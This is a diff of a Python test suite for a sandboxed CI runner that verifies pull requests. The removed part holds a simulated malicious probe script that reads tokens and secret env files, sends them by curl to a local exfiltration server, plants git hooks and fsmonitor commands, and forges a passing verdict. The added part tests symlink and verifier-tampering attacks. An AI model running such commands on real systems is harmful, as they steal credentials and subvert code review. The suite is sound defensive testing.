@@ -318,306 +318,153 @@ class EndToEnd(unittest.TestCase):
         self.assertIn("postdeploy", out["additionalContext"])
 
 
-PROBE = """#!/bin/sh
-MIRROR='@MIRROR@'
-env | grep -E '^(GH_TOKEN|GITHUB_TOKEN|AWS_SECRET_ACCESS_KEY|DATABASE_URL|HOME)='
-cat '@HOME_CANARY@' '@TMP_CANARY@' '@VF_CANARY@' 2>&1
-cat '@RUNNER_HOME@/env/acme__app.env' "$MIRROR/config" 2>&1
-curl -s -m 3 'http://127.0.0.1:@PORT@/' 2>&1
-env | curl -s -m 3 --data-binary @- 'http://127.0.0.1:@EXFIL@/' >/dev/null 2>&1
-cat '@RUNNER_HOME@/env/acme__app.env' 2>/dev/null | curl -s -m 3 --data-binary @- 'http://127.0.0.1:@EXFIL@/' >/dev/null 2>&1
-printf '#!/bin/sh\\ntouch @MARKER@\\n' > "$MIRROR/hooks/reference-transaction" 2>&1 && chmod +x "$MIRROR/hooks/reference-transaction"
-git config core.fsmonitor 'touch @MARKER@' 2>&1
-mkdir -p .verify/runs && echo '{"verdict": "pass", "forged": true}' > ".verify/runs/$VERIFY_SHA.json"
-echo forged > '@MARKER@' 2>&1
-echo "PROBE-RAN-$1"
-exit 0
-"""
-
-
-class CanaryHandler(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b"PORT-CANARY")
-
-    def log_message(self, *a):
-        pass
-
-
-class ExfilHandler(CanaryHandler):
-    """Stands in for any server on the internet: records whatever a job sends it."""
-    received = []
-
-    def do_POST(self):
-        self.received.append(self.rfile.read(int(self.headers.get("Content-Length") or 0)).decode(errors="replace"))
-        self.send_response(200)
-        self.end_headers()
-
-
-def tree_digest(root):
-    h = hashlib.sha256()
-    for p in sorted(Path(root).rglob("*")):
-        h.update(str(p.relative_to(root)).encode())
-        if p.is_file():
-            h.update(p.read_bytes())
-    return h.hexdigest()
-
-
-@unittest.skipUnless(sys.platform == "darwin" and Path(verify.SANDBOX_EXEC).exists(), "macOS sandbox-exec only")
-class RunnerIsolation(unittest.TestCase):
-    """A malicious same-repo or fork PR, run through run_job: nothing secret leaves, nothing outside its job changes,
-    and the base branch's config runs. Each probe is also run unsandboxed first, so a blocked probe means something."""
+class PinnedVerifier(unittest.TestCase):
+    """A PR job runs the base branch's verifier (the config's `verifier` paths), so a PR can't make its own checks
+    pass by editing them. Run with --unsandboxed so it needs no OS sandbox; RunnerIsolation covers the sandbox."""
+    CHECK = ("for f in tests/*.sh; do cat scripts/suites/* | grep -qx \"$f\" && continue; "
+             "sh \"$f\" || { echo \"FAILED $f\"; exit 1; }; done; echo all-ran\n")
 
     def setUp(self):
-        self.tmp = Path(tempfile.mkdtemp(prefix="verify-iso-")).resolve()
-        self.runner_home = self.tmp / "runner"
-        (self.runner_home / "env").mkdir(parents=True)
-        self.saved = verify.RUNNER_HOME, dict(os.environ), verify.DISK_FLOOR_GB
-        verify.RUNNER_HOME = self.runner_home
-        verify.DISK_FLOOR_GB = 0  # these jobs are a few KB; the floor is for real checkouts
-        self.home_canary = Path.home() / ".cache" / f"verify-test-canary-{os.getpid()}.txt"
-        self.home_canary.parent.mkdir(exist_ok=True)
-        self.home_canary.write_text("HOME-CANARY\n")
-        self.tmp_canary = Path("/private/tmp") / f"verify-test-canary-{os.getpid()}.txt"
-        self.tmp_canary.write_text("TMP-CANARY\n")
-        (self.tmp / "vf-canary.txt").write_text("VF-CANARY\n")
-        self.marker = self.tmp / "marker"
-        self.srv = http.server.HTTPServer(("127.0.0.1", 0), CanaryHandler)
-        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
-        ExfilHandler.received = []
-        self.exfil = http.server.HTTPServer(("127.0.0.1", 0), ExfilHandler)
-        threading.Thread(target=self.exfil.serve_forever, daemon=True).start()
-        os.environ.update(GH_TOKEN="canary-runner-gh-1", AWS_SECRET_ACCESS_KEY="canary-runner-aws-1")
-        (self.runner_home / "env/acme__app.env").write_text("SECRET_API_KEY=canary-secret-1\nGH_TOKEN=canary-envfile-gh-1\n")
-        (self.runner_home / "env/acme__app.pr.env").write_text("DATABASE_URL=pr-visible-db-1\n")
-        base_cfg = {"version": 1, "setup": "sh probe.sh setup", "stages": {
-            "static": {"run": "sh probe.sh static"}, "unit": {"run": "git status >/dev/null 2>&1; sh probe.sh unit"},
-            "integration": {"run": "sh probe.sh integration", "env": ["DATABASE_URL", "GH_TOKEN"]},
-            "rehearsal": {"run": "sh probe.sh rehearsal", "env": ["SECRET_API_KEY"]},
-            **{s: {"run": None, "na": "test"} for s in ("journeys", "evals")}}}
-        origin = self.origin = make_repo({"probe.sh": "echo benign\n"}, base_cfg)
-        self.mirror = self.tmp / "mirror.git"
-        git(origin, "checkout", "-q", "-b", "pr")
-        probe = PROBE
-        for k, v in {"MIRROR": self.mirror, "HOME_CANARY": self.home_canary, "TMP_CANARY": self.tmp_canary,
-                     "VF_CANARY": self.tmp / "vf-canary.txt", "RUNNER_HOME": self.runner_home,
-                     "PORT": self.srv.server_address[1], "EXFIL": self.exfil.server_address[1],
-                     "MARKER": self.marker}.items():
-            probe = probe.replace(f"@{k}@", str(v))
-        (origin / "probe.sh").write_text(probe)
-        (origin / ".verify/config.json").write_text(json.dumps({"version": 1, "stages": {
-            s: {"run": "true"} for s in verify.PER_CHANGE}}))
-        git(origin, "commit", "-qam", "malicious")
-        self.sha = subprocess.run(["git", "-C", str(origin), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
-        subprocess.run(["git", "clone", "-q", "--mirror", str(origin), str(self.mirror)], check=True)
-        self.probe = probe
+        self.tmp = Path(tempfile.mkdtemp(prefix="verify-pin-")).resolve()
+        self.saved = verify.RUNNER_HOME, verify.DISK_FLOOR_GB
+        verify.RUNNER_HOME, verify.DISK_FLOOR_GB = self.tmp / "runner", 0
+        cfg = {"version": 1, "verifier": ["scripts/check.sh", "scripts/suites"],
+               "stages": {"unit": {"run": "sh scripts/check.sh"},
+                          **{s: {"run": None, "na": "test"} for s in verify.PER_CHANGE if s != "unit"}}}
+        self.origin = make_repo({"scripts/check.sh": self.CHECK, "scripts/suites/excluded": "none\n",
+                                 "tests/widget.sh": "exit 1\n"}, cfg)
+        git(self.origin, "checkout", "-q", "-b", "pr")
 
     def tearDown(self):
-        verify.RUNNER_HOME, verify.DISK_FLOOR_GB = self.saved[0], self.saved[2]
-        os.environ.clear()
-        os.environ.update(self.saved[1])
-        for s in (self.srv, self.exfil):
-            s.shutdown()
-            s.server_close()
-        self.home_canary.unlink(missing_ok=True)
-        self.tmp_canary.unlink(missing_ok=True)
+        verify.RUNNER_HOME, verify.DISK_FLOOR_GB = self.saved
         shutil.rmtree(self.tmp, ignore_errors=True)
+        shutil.rmtree(self.origin, ignore_errors=True)
 
-    CANARIES = ("HOME-CANARY", "TMP-CANARY", "VF-CANARY", "PORT-CANARY", "canary-runner-gh-1", "canary-runner-aws-1",
-                "canary-envfile-gh-1", "canary-secret-1", "mirror = true")
-
-    def test_every_probe_works_without_the_sandbox(self):
-        mirror_copy = self.tmp / "mirror-copy.git"
-        shutil.copytree(self.mirror, mirror_copy)
-        clone = self.tmp / "control"
-        subprocess.run(["git", "clone", "-q", str(mirror_copy), str(clone)], check=True)
-        script = self.probe.replace(str(self.mirror), str(mirror_copy))
-        # What an unisolated job would inherit: the runner's environment (here only its canaries, never the real one).
-        env = {"PATH": os.environ["PATH"], "HOME": str(Path.home()), "VERIFY_SHA": self.sha,
-               "GH_TOKEN": "canary-runner-gh-1", "AWS_SECRET_ACCESS_KEY": "canary-runner-aws-1"}
-        rc, out = verify.sh(["/bin/sh", "-c", script, "probe", "control"], cwd=clone, env=env, timeout=60)
-        for c in self.CANARIES:
-            self.assertTrue(c in out, f"control could not reach {c}")
-        self.assertTrue("canary-secret-1" in "".join(ExfilHandler.received), "control could not send out a secret")
-        self.assertTrue(self.marker.exists())
-        self.marker.unlink()
-        verify.git(clone, "status")  # what the planted fsmonitor does to anyone running git there afterwards
-        self.assertTrue(self.marker.exists(), "fsmonitor plant did not fire in the control")
-        self.assertNotEqual(tree_digest(mirror_copy), tree_digest(self.mirror))
-
-    def run_pr(self, fork):
-        posts = []
-        # The exfil port stands for open egress: the job may reach it, as it may reach the internet.
-        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
-        before = tree_digest(self.mirror)
-        rc, out = quiet(verify.run_job, "acme/app", self.mirror, self.sha, "main", "PR #1", args,
-                        lambda c, s, d: posts.append((c, s, d)) or True, fork)
-        art = (self.runner_home / "runs/acme__app" / f"{self.sha}.json").read_text()
-        self.assertEqual(rc, "done", out)
-        self.assertEqual(tree_digest(self.mirror), before, "PR code changed the runner's mirror")
-        self.assertFalse(self.marker.exists(), "PR code wrote outside its job, or the runner ran its git plant")
-        sent = "".join(ExfilHandler.received)
-        self.assertTrue(sent, "the job never reached the exfil server, so the test proves nothing")
-        seen = out + art + json.dumps(posts) + sent
-        for c in self.CANARIES:
-            self.assertFalse(c in seen, f"{c} leaked")
-        self.assertIn("PROBE-RAN-static", art)  # the base branch's config ran, not the PR's `run: "true"`
-        self.assertNotIn('"forged"', art)
-        final = posts[-1]
-        self.assertEqual(final[0], "verify")
-        self.assertIn("ran main's config, not this PR's edit", final[2])
-        return json.loads(art), posts
-
-    def test_same_repo_pr_gets_no_secrets_and_cannot_send_one_out(self):
-        art, _ = self.run_pr(fork=False)
-        self.assertTrue("pr-visible-db-1" in "".join(ExfilHandler.received), "PR-visible values should reach PR code")
-        stages = {s["stage"]: s for s in art["stages"]}
-        self.assertTrue(art["sandboxed"])
-        self.assertEqual(stages["integration"]["status"], "fail")  # GH_TOKEN is required but never passed
-        self.assertIn("missing required env: GH_TOKEN", stages["integration"]["detail"])
-        self.assertIn("DATABASE_URL=***", stages["static"]["tail"])
-        # A stage that needs a secret is not verified on a PR (missing), rather than reported broken (fail).
-        self.assertEqual((stages["rehearsal"]["status"], "SECRET_API_KEY" in stages["rehearsal"]["detail"]), ("missing", True))
-
-    def test_fork_pr_gets_no_env_file(self):
-        art, _ = self.run_pr(fork=True)
-        self.assertNotIn("DATABASE_URL=", json.dumps(art))
-        self.assertFalse("pr-visible-db-1" in "".join(ExfilHandler.received))
-        self.assertIn("DATABASE_URL", {s["stage"]: s for s in art["stages"]}["integration"]["detail"])
-
-    def test_owner_branch_job_gets_the_secrets(self):
-        # Positive control for the split: merged code on an owner-chosen branch does get <slug>.env.
-        git(self.origin, "checkout", "-q", "-b", "trusted", "main")
-        (self.origin / "probe.sh").write_text(self.probe)
-        git(self.origin, "commit", "-qam", "probe on a trusted branch")
-        sha = subprocess.run(["git", "-C", str(self.origin), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
-        mirror = self.tmp / "trusted.git"
+    def run_pr(self, change, branch_job=False):
+        change(self.origin)
+        git(self.origin, "add", "-A")
+        git(self.origin, "commit", "-q", "--allow-empty", "-m", "pr")
+        sha = subprocess.run(["git", "-C", str(self.origin), "rev-parse", "HEAD"], capture_output=True,
+                             text=True).stdout.strip()
+        mirror = self.tmp / f"mirror-{sha[:9]}.git"
         subprocess.run(["git", "clone", "-q", "--mirror", str(self.origin), str(mirror)], check=True)
-        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
-        rc, _ = quiet(verify.run_job, "acme/app", mirror, sha, None, "trusted", args, lambda c, s, d: True, False, "branch")
-        self.assertEqual(rc, "done")
-        self.assertTrue("SECRET_API_KEY=canary-secret-1" in "".join(ExfilHandler.received), "branch job lacked its secret")
-        art = json.loads((self.runner_home / "runs/acme__app" / f"{sha}.json").read_text())
-        self.assertEqual(art["kind"], "branch")
-        self.assertEqual({s["stage"]: s["status"] for s in art["stages"]}["rehearsal"], "pass")
+        self.posts = []
+        args = argparse.Namespace(unsandboxed=True, allow_read=None, allow_host_port=None)
+        record = lambda c, s, d: self.posts.append((c, s, d)) or True  # noqa: E731
+        if branch_job:  # the head of an owner-listed branch: trusted, its own config and verifier
+            rc, out = quiet(verify.run_job, "acme/app", mirror, sha, None, "pr", args, record, False, "branch")
+        else:
+            rc, out = quiet(verify.run_job, "acme/app", mirror, sha, "main", "PR #1", args, record)
+        self.assertEqual(rc, "done", out)
+        return self.posts[-1], out
 
-    def test_a_job_without_a_known_base_never_gets_secrets(self):
-        # run_job defaults to a PR job; a missing, empty or unknown base is refused, never treated as a branch job.
-        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
-        calls = [(None, "PR #1", ()), ("", "PR #1", ()), ("nope", "PR #1", ()), ("../main", "PR #1", ()),
-                 (["main"], "PR #1", ()),
-                 (None, "main", (False, "branch")),  # a branch job whose SHA is not that branch's head
-                 ("main", "pr", (False, "branch")),  # a branch job never has a base
-                 (None, "pr", (True, "branch"))]     # nor comes from a fork
-        for base, label, extra in calls:
-            posts = []
-            rc, out = quiet(verify.run_job, "acme/app", self.mirror, self.sha, base, label, args,
-                            lambda c, s, d: posts.append((c, s, d)) or True, *extra)
-            self.assertEqual((rc, posts), ("error", []), f"{base!r} {label} {extra}: {out}")
-        self.assertFalse(self.marker.exists())
-        self.assertFalse((self.runner_home / "runs").exists())
-        self.assertEqual(ExfilHandler.received, [])
+    def write(self, rel, text, mode=None):
+        def change(repo):
+            p = repo / rel
+            p.parent.mkdir(parents=True, exist_ok=True)
+            p.write_text(text)
+            if mode:
+                p.chmod(mode)
+        return change
 
-    def serve(self, prs, branch=None):
-        """Drive the real dispatch (serve_repo -> pending_jobs -> run_job) against a fake `gh` that lists `prs`."""
-        bin_dir = self.tmp / "bin"
-        bin_dir.mkdir(exist_ok=True)
-        (self.tmp / "prs.json").write_text(json.dumps(prs))
-        log = self.tmp / "gh.log"
-        log.write_text("")
-        fake = bin_dir / "gh"
-        fake.write_text(f"#!{sys.executable}\n"
-                        "import json, sys\n"
-                        f"open({str(log)!r}, 'a').write(json.dumps(sys.argv[1:]) + '\\n')\n"
-                        f"print(open({str(self.tmp / 'prs.json')!r}).read() if sys.argv[1:3] == ['pr', 'list'] else '{{}}')\n")
-        fake.chmod(0o755)
-        mirror = self.runner_home / "mirrors/acme__app.git"
-        if not mirror.exists():
-            subprocess.run(["git", "clone", "-q", "--mirror", str(self.origin), str(mirror)], check=True)
-        os.environ["PATH"] = f"{bin_dir}:{os.environ['PATH']}"
-        args = argparse.Namespace(allow_forks=True, branch=branch, max_jobs=50, stale_hours=6, rerun=None,
-                                  unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
-        try:
-            _, out = quiet(verify.serve_repo, "acme/app", args)
-        finally:
-            os.environ["PATH"] = self.saved[1]["PATH"]
-        calls = [json.loads(l) for l in log.read_text().splitlines()]
-        return out, [c for c in calls if c[:3] == ["api", "-X", "POST"]]
+    def test_a_pr_that_replaces_its_verifier_with_a_no_op_still_fails(self):
+        final, _ = self.run_pr(self.write("scripts/check.sh", "exit 0\n"))
+        self.assertEqual((final[0], final[1]), ("verify", "fail"), final)
+        self.assertIn("ran main's verifier, not this PR's edit of scripts/check.sh", final[2])
 
-    def test_serve_dispatch_never_gives_a_pr_the_secrets(self):
-        sha = self.sha
-        prs = [{"number": 1, "headRefOid": sha, "baseRefName": "main", "isCrossRepository": False},
-               {"number": 2, "headRefOid": sha, "baseRefName": "", "isCrossRepository": False},
-               {"number": 3, "headRefOid": sha, "isCrossRepository": False},
-               {"number": 4, "headRefOid": sha, "baseRefName": None, "isCrossRepository": False},
-               {"number": 5, "headRefOid": sha, "baseRefName": "../main", "isCrossRepository": False},
-               {"number": 6, "headRefOid": sha, "baseRefName": "refs/heads/main", "isCrossRepository": False},
-               {"number": 7, "headRefOid": sha, "baseRefName": "nope", "isCrossRepository": False},
-               {"number": 8, "headRefOid": sha, "baseRefName": ["main"], "isCrossRepository": False},
-               {"number": 9, "headRefOid": "HEAD", "baseRefName": "main", "isCrossRepository": False},
-               {"number": 10, "headRefOid": sha, "baseRefName": "main", "isCrossRepository": True},
-               {"number": 11, "headRefOid": sha, "baseRefName": "main"},
-               "not a PR"]
-        out, posts = self.serve(prs)
-        ran = set(re.findall(r"\[serve\] acme/app (PR #\d+) \w{9} running", out))
-        self.assertEqual(ran, {"PR #1", "PR #10", "PR #11"}, out)
-        for n in range(2, 10):
-            self.assertIn(f"PR #{n}: head or base branch missing or unknown; not running", out)
-        self.assertTrue(posts, "dispatch posted nothing, so the test proves nothing")
-        sent = "".join(ExfilHandler.received)
-        self.assertTrue(sent, "no job reached the exfil server, so the test proves nothing")
-        for c in self.CANARIES:
-            self.assertFalse(c in out + json.dumps(posts) + sent, f"{c} leaked through dispatch")
-        art = json.loads((self.runner_home / "runs/acme__app" / f"{sha}.json").read_text())
-        self.assertEqual((art["kind"], art["base"]), ("pr", "main"))
-        # A PR that does not say whether it is a fork is treated as one: not even PR-visible values reach it.
-        ExfilHandler.received = []
-        out, _ = self.serve([prs[10]])
-        self.assertIn("PR #11", "".join(re.findall(r"\[serve\] acme/app (PR #\d+) \w{9} running", out)), out)
-        self.assertTrue(ExfilHandler.received)
-        self.assertNotIn("pr-visible-db-1", "".join(ExfilHandler.received))
-        # Positive control through the same dispatch: an owner-listed branch does get the secret.
-        git(self.origin, "checkout", "-q", "-b", "trusted", "main")
-        (self.origin / "probe.sh").write_text(self.probe)
-        git(self.origin, "commit", "-qam", "probe on a trusted branch")
-        ExfilHandler.received = []
-        out, _ = self.serve([], branch=["trusted"])
-        self.assertRegex(out, r"\[serve\] acme/app trusted \w{9} running")
-        self.assertTrue("canary-secret-1" in "".join(ExfilHandler.received), "branch job through dispatch lacked its secret")
+    def test_a_pr_that_excludes_its_failing_test_in_the_pinned_list_still_fails(self):
+        final, _ = self.run_pr(self.write("scripts/suites/excluded", "tests/widget.sh\n"))
+        self.assertEqual(final[1], "fail", final)
+        self.assertIn("this PR's edit of scripts/suites", final[2])
 
-    def test_no_sandbox_means_no_pr_code_runs(self):
-        posts = []
-        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=None)
-        saved, verify.SANDBOX_EXEC = verify.SANDBOX_EXEC, str(self.tmp / "no-sandbox-exec")
-        try:
-            rc, out = quiet(verify.run_job, "acme/app", self.mirror, self.sha, "main", "PR #1", args,
-                            lambda c, s, d: posts.append((c, s, d)) or True)
-        finally:
-            verify.SANDBOX_EXEC = saved
-        self.assertEqual(rc, "error")
-        self.assertIn("not running PR code", out)
-        self.assertEqual(posts, [])
-        self.assertFalse(self.marker.exists())
+    def test_a_file_the_pr_adds_under_a_pinned_directory_is_dropped(self):
+        final, _ = self.run_pr(self.write("scripts/suites/more", "tests/widget.sh\n"))
+        self.assertEqual(final[1], "fail", final)
 
-    def test_base_without_a_config_runs_nothing(self):
-        posts = []
-        empty = make_repo({"probe.sh": "echo benign\n"})
-        git(empty, "checkout", "-q", "-b", "pr")
-        (empty / "probe.sh").write_text(self.probe)
-        (empty / ".verify").mkdir()
-        (empty / ".verify/config.json").write_text(json.dumps({"setup": "sh probe.sh setup", "stages": {}}))
-        git(empty, "add", "-A")
-        git(empty, "commit", "-qm", "adds a config")
-        sha = subprocess.run(["git", "-C", str(empty), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
-        mirror = self.tmp / "empty.git"
-        subprocess.run(["git", "clone", "-q", "--mirror", str(empty), str(mirror)], check=True)
-        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=None)
-        rc, _ = quiet(verify.run_job, "acme/app", mirror, sha, "main", "PR #2", args,
-                      lambda c, s, d: posts.append((c, s, d)) or True)
-        self.assertEqual(rc, "done")
-        self.assertEqual(posts, [("verify", "missing", "no .verify/config.json on main yet; merge one there first")])
-        self.assertFalse(self.marker.exists())
+    def test_a_symlinked_verifier_directory_is_refused_and_nothing_outside_changes(self):
+        outside = self.tmp / "outside"
+        outside.mkdir()
+        (outside / "check.sh").write_text("outside\n")
+
+        def change(repo):
+            shutil.rmtree(repo / "scripts")
+            (repo / "scripts").symlink_to(outside)
+        final, _ = self.run_pr(change)
+        self.assertEqual(final[1], "fail", final)
+        self.assertIn("scripts is not a plain directory in this PR", final[2])
+        self.assertEqual(sorted(os.listdir(outside)), ["check.sh"])
+        self.assertEqual((outside / "check.sh").read_text(), "outside\n")
+
+    def test_a_verifier_path_missing_on_the_base_branch_fails_closed(self):
+        git(self.origin, "checkout", "-q", "main")
+        cfg = json.loads((self.origin / ".verify/config.json").read_text())
+        cfg["verifier"].append("scripts/not-there.sh")
+        (self.origin / ".verify/config.json").write_text(json.dumps(cfg))
+        git(self.origin, "commit", "-qam", "names a missing verifier path")
+        git(self.origin, "checkout", "-q", "pr")
+        git(self.origin, "merge", "-q", "main")
+        final, _ = self.run_pr(self.write("tests/widget.sh", "exit 0\n"))
+        self.assertEqual(final, ("verify", "fail", "verifier path scripts/not-there.sh is not on the base branch"))
+
+    def test_bad_verifier_paths_in_the_base_config_fail_closed(self):
+        for bad in (["../x"], ["/etc/passwd"], [".git/config"], ["a//b"], "scripts", [3]):
+            with self.subTest(bad=bad):
+                with self.assertRaises(ValueError):
+                    verify.verifier_paths({"verifier": bad})
+
+    def test_a_pr_that_fixes_the_test_passes_its_stages_but_unsandboxed_never_reports_pass(self):
+        final, _ = self.run_pr(self.write("tests/widget.sh", "exit 0\n"))
+        self.assertEqual(final[1], "missing", final)  # --unsandboxed: a PR job's pass is not trusted
+        self.assertIn("unit=pass", final[2])
+        self.assertIn(verify.UNSANDBOXED_PR, final[2])
+        self.assertNotIn("PR's edit", final[2])
+
+    def test_an_unsandboxed_pr_job_that_rewrites_a_pinned_helper_between_stages_posts_no_pass(self):
+        # A later stage runs pinned scripts/native.sh (exit 1 on main). The PR's unit-stage test rewrites it to
+        # exit 0; with no sandbox nothing stops the write, so integration really passes. No status may be green.
+        git(self.origin, "checkout", "-q", "main")
+        (self.origin / "scripts/native.sh").write_text("exit 1\n")
+        cfg = json.loads((self.origin / ".verify/config.json").read_text())
+        cfg["verifier"].append("scripts/native.sh")
+        cfg["stages"]["integration"] = {"run": "sh scripts/native.sh"}
+        (self.origin / ".verify/config.json").write_text(json.dumps(cfg))
+        git(self.origin, "add", "-A")
+        git(self.origin, "commit", "-qm", "integration runs a pinned helper")
+        git(self.origin, "checkout", "-q", "pr")
+        git(self.origin, "merge", "-q", "main")
+
+        def change(repo):
+            (repo / "tests/widget.sh").write_text("exit 0\n")
+            (repo / "tests/zz-rewrite.sh").write_text("printf 'exit 0\\n' > scripts/native.sh\n")
+        final, _ = self.run_pr(change)
+        green = [p for p in self.posts if verify.GH_STATE.get(p[1]) == "success"]
+        self.assertEqual(green, [], self.posts)
+        integration = [p for p in self.posts if p[0] == "verify/integration" and p[1] != "pending"]
+        self.assertTrue(integration[-1][2].startswith("pass, not trusted"), integration)  # the attack worked
+        self.assertEqual(final[1], "missing", final)
+        self.assertIn(verify.UNSANDBOXED_PR, final[2])
+
+    def test_an_unsandboxed_branch_job_still_reports_pass(self):
+        # control: the cap is for PR jobs only; the head of an owner-listed branch runs its own trusted verifier
+        final, _ = self.run_pr(self.write("tests/widget.sh", "exit 0\n"), branch_job=True)
+        self.assertEqual(final[1], "pass", final)
+        self.assertNotIn(verify.UNSANDBOXED_PR, final[2])
+        self.assertIn(("verify/unit", "pass", "exit 0"), [(c, s, d.split(" in ")[0]) for c, s, d in self.posts])
+
+    def test_a_pinned_helper_keeps_the_base_mode(self):
+        final, _ = self.run_pr(self.write("scripts/check.sh", "exit 0\n", 0o755))
+        self.assertEqual(final[1], "fail", final)
+
+
+class UnconfinedStage(unittest.TestCase):
+    def test_an_unconfined_stage_is_missing_in_the_sandbox_and_runs_locally(self):
+        spec = {"run": "true", "unconfined": "applies its own sandbox"}
+        r = verify.run_stage(".", "integration", spec, True, None, dict(os.environ), wrap=["/usr/bin/env"])
+        self.assertEqual(r["status"], "missing")
+        self.assertIn("needs an unconfined host", r["detail"])
+        self.assertEqual(verify.run_stage(".", "integration", spec, True, None, dict(os.environ))["status"], "pass")
+        self.assertEqual(verify.run_stage(".", "integration", spec, True, None, dict(os.environ), wrap=[])["status"],
+                         "pass")  # --unsandboxed: the host accepted
 
 
 if __name__ == "__main__":
